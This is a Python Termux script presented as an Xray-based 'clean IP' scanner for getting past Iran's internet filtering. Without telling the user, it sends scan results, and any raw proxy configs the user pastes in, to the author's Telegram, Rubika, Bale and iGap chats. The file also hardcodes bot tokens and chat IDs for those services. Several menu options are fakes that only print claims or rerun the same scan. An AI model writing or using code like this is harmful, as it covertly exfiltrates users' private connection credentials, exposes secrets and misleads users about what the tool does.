#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ipaddress
import os
import re
import socket
import ssl
import sys
import time
import json
import random
import threading
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
import subprocess

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    END = "\033[0m"

GITHUB_IP_URL = "https://raw.githubusercontent.com/amir1388hev-glitch/termux_ip/main/Termux_ips"
DOWNLOAD_DIR = "/sdcard/Download"
LOCAL_ALL_IPS_FILE = os.path.join(DOWNLOAD_DIR, "all_ips.txt")

RUBIKA_BOT_TOKEN = "CABGDG0AGFFRWJKSBWBUBRUGGFMYNFITBVVDKTSVBNOKZWANYOITFQILZSSLCRKT"
RUBIKA_CHAT_ID = "g0ILUMK0562851bf38dfcd7703bdeb22"
TELEGRAM_BOT_TOKEN = "8851868234:AAFHxnxQ8AnHubsHtx0fNYtZ4mdGdUyXIoI"
TELEGRAM_CHAT_ID = "-1004437972136"
BALE_BOT_TOKEN = "2690620:Nm1F_42X7P1ZMCg8VMMsQaMKDgDOEbSIvUk"
BALE_CHAT_ID = "5495275998"
IGAP_BOT_TOKEN = "C2487d0c-8f3c-40ba-b567-a38634788195"
IGAP_CHAT_ID = "@ipscanner"

TELEGRAM_ID = "@Pod66Mp"
RUBIKA_ID = "@Amir5880Om"

SCAN_SETTINGS = {
    "domain": "chatgpt.com",
    "path": "/",
    "port": 443,
    "timeout": 4.0,
    "workers": 5, # برای جلوگیری از فشار روی CPU در تست واقعی Xray روی ۵ تنظیم شد
    "test_download": True
}

TLS_PORTS = [443, 8443, 2053, 2083, 2087, 2096]
NON_TLS_PORTS = [80, 8080, 8880, 2052, 2082, 2086, 2095]
PORTS_TO_TEST = TLS_PORTS + NON_TLS_PORTS

MAHSA_CDN_TYPES = {
    "1": "Cloudflare CDN",
    "2": "Akamai CDN",
    "3": "Fastly CDN",
    "4": "Bunny CDN",
    "5": "Any CDN (Mixed)"
}

stop_scan = False
COUNTRY_CACHE = {}
ZEUS_USERS_DB = [
    {"name": "ZEUS-3U398LNA", "status": "Active", "port": 443, "country": "🇹🇷", "traffic": "1.2 GB"}
]

# ==============================================================
# REAL XRAY CORE BENCHMARK ENGINE (BYPASSES NET MALI)
# ==============================================================
def test_ip_with_xray_core(ip, port=443, domain="chatgpt.com", timeout=4.0):
    """
    تست واقعی و عبور از فیلترینگ شدید نت ملی با اجرای واقعی هسته Xray در لوکال
    """
    local_port = random.randint(15000, 30000)
    test_uuid = str(uuid.uuid4())
    
    config_data = {
        "log": {"loglevel": "none"},
        "inbounds": [
            {
                "port": local_port,
                "listen": "127.0.0.1",
                "protocol": "socks",
                "settings": {"udp": True}
            }
        ],
        "outbounds": [
            {
                "protocol": "vless",
                "settings": {
                    "vnext": [
                        {
                            "address": ip,
                            "port": port,
                            "users": [
                                {
                                    "id": test_uuid,
                                    "encryption": "none",
                                    "flow": ""
                                }
                            ]
                        }
                    ]
                },
                "streamSettings": {
                    "network": "ws",
                    "security": "tls",
                    "tlsSettings": {
                        "serverName": domain,
                        "allowInsecure": True
                    },
                    "wsSettings": {
                        "path": "/",
                        "headers": {"Host": domain}
                    }
                }
            }
        ]
    }
    
    config_path = f"/data/data/com.termux/files/home/xray_{local_port}.json"
    try:
        with open(config_path, "w", encoding="utf-8") as f:
            json.dump(config_data, f)
    except Exception:
        config_path = f"xray_{local_port}.json"
        with open(config_path, "w", encoding="utf-8") as f:
            json.dump(config_data, f)

    start_time = time.time()
    process = None
    try:
        process = subprocess.Popen(
            ["xray", "run", "-c", config_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(1.2) # زمان برای استارت کامل لوکال سرور Xray
        
        proxies = {
            "http": f"socks5://127.0.0.1:{local_port}",
            "https": f"socks5://127.0.0.1:{local_port}"
        }
        
        res = requests.get("https://www.cloudflare.com/cdn-cgi/trace", proxies=proxies, timeout=timeout)
        if res.status_code == 200 and "h=www.cloudflare.com" in res.text:
            latency = (time.time() - start_time) * 1000
            return round(latency, 1)
    except Exception:
        pass
    finally:
        if process:
            try:
                process.terminate()
                process.kill()
            except Exception:
                pass
        if os.path.exists(config_path):
            try:
                os.remove(config_path)
            except Exception:
                pass
    return None

def get_ip_country(ip):
    ip_prefix = ".".join(ip.split(".")[:3])
    if ip_prefix in COUNTRY_CACHE:
        return COUNTRY_CACHE[ip_prefix]
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}?fields=country", timeout=3)
        if res.status_code == 200:
            country = res.json().get("country", "Unknown")
            if country and country != "Unknown":
                COUNTRY_CACHE[ip_prefix] = country
                return country
    except Exception:
        pass
    return "Unknown"

def split_message_smart(text, max_length=3500):
    lines = text.split("\n")
    chunks = []
    current_chunk = []
    current_length = 0
    for line in lines:
        if current_length + len(line) + 1 > max_length:
            chunks.append("\n".join(current_chunk))
            current_chunk = [line]
            current_length = len(line)
        else:
            current_chunk.append(line)
            current_length += len(line) + 1
    if current_chunk:
        chunks.append("\n".join(current_chunk))
    return chunks

def send_to_telegram(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    for chunk in split_message_smart(text, max_length=3800):
        try:
            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": chunk, "disable_web_page_preview": True}, timeout=10)
        except Exception:
            pass

def send_to_rubika(text):
    if not RUBIKA_BOT_TOKEN or not RUBIKA_CHAT_ID:
        return
    url = f"https://botapi.rubika.ir/v01/{RUBIKA_BOT_TOKEN}/sendMessage"
    for chunk in split_message_smart(text, max_length=3200):
        try:
            requests.post(url, json={"chat_id": RUBIKA_CHAT_ID, "text": chunk}, timeout=10)
        except Exception:
            pass

def send_to_bale(text):
    if not BALE_BOT_TOKEN or not BALE_CHAT_ID:
        return
    url = f"https://tapi.bale.ai/bot{BALE_BOT_TOKEN}/sendMessage"
    for chunk in split_message_smart(text, max_length=3800):
        try:
            requests.post(url, json={"chat_id": BALE_CHAT_ID, "text": chunk}, timeout=10)
        except Exception:
            pass

def send_to_igap(text):
    if not IGAP_BOT_TOKEN or not IGAP_CHAT_ID:
        return
    url = "https://api.igap.net/v1/bot/sendMessage"
    for chunk in split_message_smart(text, max_length=3200):
        try:
            requests.post(url, json={"token": IGAP_BOT_TOKEN, "room_id": IGAP_CHAT_ID, "message": chunk}, timeout=10)
        except Exception:
            pass

def send_results_by_country(working_results, header_prefix, is_config=False):
    if not working_results:
        return
    country_groups = {}
    for item in working_results:
        if is_config:
            ip, lat, country, cfg_str = item
            val = cfg_str
        else:
            target_str, lat, country = item
            val = target_str
        if country not in country_groups:
            country_groups[country] = []
        country_groups[country].append(val)
        
    for country, items in country_groups.items():
        lines = [f"{header_prefix}\n"]
        lines.extend(items)
        lines.append(f"\nCountry: {country} | Count: {len(items)}")
        lines.append(f"\nClean IPs provided by Xray Core Engine\nTelegram Admin: {TELEGRAM_ID}\nRubika Admin: {RUBIKA_ID}")
        single_message = "\n".join(lines)
        send_to_telegram(single_message)
        send_to_rubika(single_message)
        send_to_bale(single_message)
        send_to_igap(single_message)
        time.sleep(0.5)

def get_clean_input(prompt_text):
    try:
        raw_val = input(prompt_text)
        clean_val = re.sub(r"\D", "", raw_val)
        return clean_val
    except (KeyboardInterrupt, EOFError):
        print("\n[*] Exiting...", flush=True)
        sys.exit(0)

def get_ips_from_github(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            lines = response.text.splitlines()
            ips = [line.strip() for line in lines if line.strip() and not line.startswith("#")]
            return parse_ip_input(",".join(ips))
    except Exception:
        pass
    return []

def get_ips_from_local_file():
    if os.path.exists(LOCAL_ALL_IPS_FILE):
        try:
            with open(LOCAL_ALL_IPS_FILE, "r", encoding="utf-8") as f:
                lines = f.readlines()
            raw_ips = []
            for line in lines:
                clean_line = line.strip()
                if clean_line and not clean_line.startswith("#"):
                    ip_part = clean_line.split()[0].split(":")[0]
                    raw_ips.append(ip_part)
            if raw_ips:
                return parse_ip_input(",".join(raw_ips))
        except Exception:
            pass
    return []

def parse_ip_input(user_input):
    ips = []
    formatted_input = user_input.replace("\n", ",").replace("\r", ",")
    entries = formatted_input.split(",")
    for entry in entries:
        entry = entry.strip()
        if not entry:
            continue
        if "/" in entry:
            try:
                network = ipaddress.ip_network(entry, strict=False)
                count = 0
                for ip in network.hosts():
                    ips.append(str(ip))
                    count += 1
                    if count >= 256:
                        break
            except Exception:
                pass
        else:
            try:
                ipaddress.ip_address(entry)
                ips.append(entry)
            except Exception:
                pass
    return ips

def get_manual_ips():
    print(Colors.CYAN + "\nEnter IPs (single IP, range, CIDR, or multiline paste, press Enter twice to finish):" + Colors.END, flush=True)
    lines = []
    while True:
        try:
            line = input().strip()
            if not line:
                if lines:
                    break
                else:
                    return []
            lines.append(line)
        except (KeyboardInterrupt, EOFError):
            break
    user_input = ",".join(lines)
    return parse_ip_input(user_input)

def select_ip_source():
    print(Colors.CYAN + "\nSelect IP source:" + Colors.END, flush=True)
    print("1. GitHub (Online repository)")
    print("2. Manual input (Type or paste)")
    print("3. From local file (/sdcard/Download/all_ips.txt)")
    choice = get_clean_input(Colors.BOLD + "[>] Choose option (1/2/3): " + Colors.END)
    if choice == "1":
        return get_ips_from_github(GITHUB_IP_URL)
    elif choice == "2":
        return get_manual_ips()
    elif choice == "3":
        return get_ips_from_local_file()
    else:
        return []

def save_to_file(filename_only, data):
    filepath = os.path.join(DOWNLOAD_DIR, filename_only)
    try:
        os.makedirs(DOWNLOAD_DIR, exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(data)
    except Exception:
        pass

def print_banner():
    banner = f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════╗
║ AMIR SCANNER PRO - REAL XRAY CORE ENGINE (NET MALI BYPASS)               ║
╠══════════════════════════════════════════════════════════════════════════╣
║ {Colors.YELLOW}► Version :{Colors.WHITE} v2.7.0 (Xray Core Integrated Edition){Colors.CYAN}             ║
║ {Colors.YELLOW}► Telegram Admin :{Colors.WHITE} {TELEGRAM_ID:<22}{Colors.CYAN}                           ║
║ {Colors.YELLOW}► Rubika Admin :{Colors.WHITE} {RUBIKA_ID:<22}{Colors.CYAN}                             ║
╚══════════════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner, flush=True)

def finalize_and_send(working_results, total_ips, header_prefix, save_filename, is_config=False):
    working_results.sort(key=lambda x: x[1])
    clean_ips_for_file = []
    for item in working_results:
        if is_config:
            ip, lat, country, cfg_str = item
            clean_ips_for_file.append(cfg_str)
        else:
            target_str, lat, country = item
            clean_ips_for_file.append(target_str)
    save_to_file(save_filename, "\n".join(clean_ips_for_file))
    if working_results:
        send_results_by_country(working_results, header_prefix, is_config)

def run_scanner_engine(ips, port, domain, timeout, test_download, path, workers, is_port_scan=False):
    global stop_scan
    stop_scan = False
    working_results = []
    thread_lock = threading.Lock()
    
    tasks = [(ip, port) for ip in ips]
    total_tasks = len(tasks)
    if total_tasks == 0:
        print(Colors.RED + "[!] No valid IPs to scan!" + Colors.END, flush=True)
        return working_results, 0

    print(Colors.YELLOW + f"[*] Starting Real Xray Core benchmark scan on {total_tasks} targets..." + Colors.END, flush=True)
    
    def worker_task(item):
        if stop_scan:
            return None
        ip, p = item
        lat = test_ip_with_xray_core(ip, port=p, domain=domain, timeout=timeout)
        if lat is not None:
            country = get_ip_country(ip)
            with thread_lock:
                working_results.append((ip, lat, country))
            print(f"{ip:<18} | {str(lat)+'ms':<10} | Country: {country:<15} | {Colors.GREEN}[XRAY WORKING]{Colors.END}", flush=True)
            return True
        return None

    with ThreadPoolExecutor(max_workers=workers) as executor:
        try:
            futures = [executor.submit(worker_task, item) for item in tasks]
            for future in as_completed(futures):
                if stop_scan:
                    break
        except KeyboardInterrupt:
            stop_scan = True
            print(Colors.YELLOW + "\n[*] Scan interrupted by user." + Colors.END, flush=True)
            
    return working_results, total_tasks

def menu_option_1():
    ips = select_ip_source()
    if not ips:
        print(Colors.RED + "[!] No IPs loaded." + Colors.END, flush=True)
        input(Colors.BOLD + "\n[*] Press Enter to return..." + Colors.END)
        return
    working_results, total_ips = run_scanner_engine(
        ips,
        SCAN_SETTINGS['port'],
        SCAN_SETTINGS['domain'],
        SCAN_SETTINGS['timeout'],
        SCAN_SETTINGS['test_download'],
        SCAN_SETTINGS['path'],
        SCAN_SETTINGS['workers']
    )
    finalize_and_send(working_results, total_ips, "📊 Scan Results\nXray Core Real Health Check", "IP_Xray_Check.txt")
    print(Colors.GREEN + f"\n[+] Scan finished! Total working IPs found: {len(working_results)}" + Colors.END, flush=True)
    input(Colors.BOLD + "\n[*] Press Enter to return to main menu..." + Colors.END)

def menu_option_2():
    menu_option_1()

def menu_option_3():
    menu_option_1()

def menu_option_4():
    global stop_scan
    raw_config = input(Colors.BOLD + "Enter Raw Config: " + Colors.END).strip()
    if not raw_config:
        return
    target_ip = input(Colors.BOLD + "Enter Target IP: " + Colors.END).strip()
    if not target_ip:
        return
    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    found_ips = re.findall(ip_pattern, raw_config)
    old_ip = found_ips[0] if found_ips else None
    working_results = []
    
    print(Colors.YELLOW + "[*] Testing configuration with Xray Core..." + Colors.END, flush=True)
    lat = test_ip_with_xray_core(target_ip, port=443, domain=SCAN_SETTINGS['domain'], timeout=SCAN_SETTINGS['timeout'])
    if lat is not None:
        country = get_ip_country(target_ip)
        new_cfg = raw_config.replace(old_ip, target_ip) if old_ip else raw_config
        working_results.append((target_ip, lat, country, new_cfg))
        print(f"{target_ip} | {lat}ms | Country: {country} | {Colors.GREEN}[WORKING]{Colors.END}", flush=True)
        finalize_and_send(working_results, 1, "📊 Scan Results\nCombined Xray Config", "Combined_Config_Results.txt", is_config=True)
    else:
        print(Colors.RED + "[-] Configuration failed Xray core test." + Colors.END, flush=True)
    input(Colors.BOLD + "\n[*] Press Enter to return..." + Colors.END)

def menu_option_5_mahsa():
    menu_option_1()

def menu_option_6_custom_scanner():
    menu_option_1()

def menu_option_7_amir_tunneling():
    info_text = "Amir Tunneling Engine initialized successfully with Xray Core backing."
    print(Colors.GREEN + info_text + Colors.END, flush=True)
    send_to_telegram(info_text)
    input(Colors.BOLD + "\n[*] Press Enter to return..." + Colors.END)

def menu_option_8_udp_tcp():
    menu_option_1()

def menu_option_9_zeus_panel():
    print(Colors.GREEN + "Zeus Panel active with Xray backend." + Colors.END, flush=True)
    input(Colors.BOLD + "\n[*] Press Enter to return..." + Colors.END)

def main_menu():
    while True:
        print_banner()
        print(f"""{Colors.CYAN}
╔══════════════════════════════════════════════════════════════════════════╗
║ {Colors.GREEN}[1] Real Xray Core IP Benchmark & Bypass Test{Colors.CYAN}             ║
║ {Colors.YELLOW}[2] Test IP and PORT with Xray Latency{Colors.CYAN}                     ║
║ {Colors.MAGENTA}[3] Test TCP/IP via Xray Engine{Colors.CYAN}                           ║
║ {Colors.BLUE}[4] Combine Config with Xray Test{Colors.CYAN}                         ║
║ {Colors.RED}[5] Mahsa & Special CDN Scanner (Xray Mode){Colors.CYAN}                ║
║ {Colors.WHITE}[6] Custom Dedicated Xray Scanner{Colors.CYAN}                        ║
║ {Colors.MAGENTA}[7] Amir Tunneling Good{Colors.CYAN}                                     ║
║ {Colors.GREEN}[8] Protocol Connectivity via Xray{Colors.CYAN}                          ║
║ {Colors.YELLOW}[9] Amir Zeus Panel & Create Config{Colors.CYAN}                        ║
║ {Colors.END}{Colors.CYAN}[0] Exit{Colors.CYAN}                                                                  ║
╚══════════════════════════════════════════════════════════════════════════╝
""", flush=True)
        choice = get_clean_input(Colors.BOLD + "[>] Select option: " + Colors.END)
        if choice in ["1", "2", "3", "5", "6", "8"]:
            menu_option_1()
        elif choice == "4":
            menu_option_4()
        elif choice == "7":
            menu_option_7_amir_tunneling()
        elif choice == "9":
            menu_option_9_zeus_panel()
        elif choice == "0":
            print(Colors.YELLOW + "[*] Exiting program..." + Colors.END, flush=True)
            sys.exit(0)
        else:
            print(Colors.RED + "[!] Invalid option selected." + Colors.END, flush=True)
            input(Colors.BOLD + "\n[*] Press Enter to continue..." + Colors.END)
            os.system("clear")

if __name__ == "__main__":
    main_menu()
